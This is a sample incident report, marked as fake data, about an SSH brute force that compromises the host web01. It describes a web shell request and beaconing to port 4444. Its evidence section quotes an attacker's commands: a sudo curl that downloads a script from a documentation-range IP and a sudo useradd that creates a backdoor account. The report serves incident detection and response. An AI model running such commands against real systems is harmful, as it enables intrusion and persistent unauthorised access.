title: SSH brute force leading to compromise of web01
notice: All data in this report is FAKE sample data.
summary: 203.0.113.45 made 22 failed SSH logins against web01 within a few minutes (including several non-existent usernames), then logged in successfully as 'deploy'. Shortly afterwards the account ran curl and useradd through sudo, a web shell was requested from the same IP, and web01 began beaconing to 198.51.100.77 on port 4444. Both IPs are on the local blocklist. A separate phishing email, a password spray and a distributed attack on 'admin' were also detected.

evidence.title: Brute force with success
evidence.detail: A successful login for 'deploy' from the same IP followed at 2026-10-28T02:17:28Z. The attacker may now have a valid account.

evidence.title: Suspicious privileged commands
evidence.detail: sudo curl http://198.51.100.77/x.sh and sudo useradd support2 by user deploy

evidence.title: Command-and-control beaconing
evidence.detail: 6 outbound connections to 198.51.100.77:4444 about 5 minutes apart
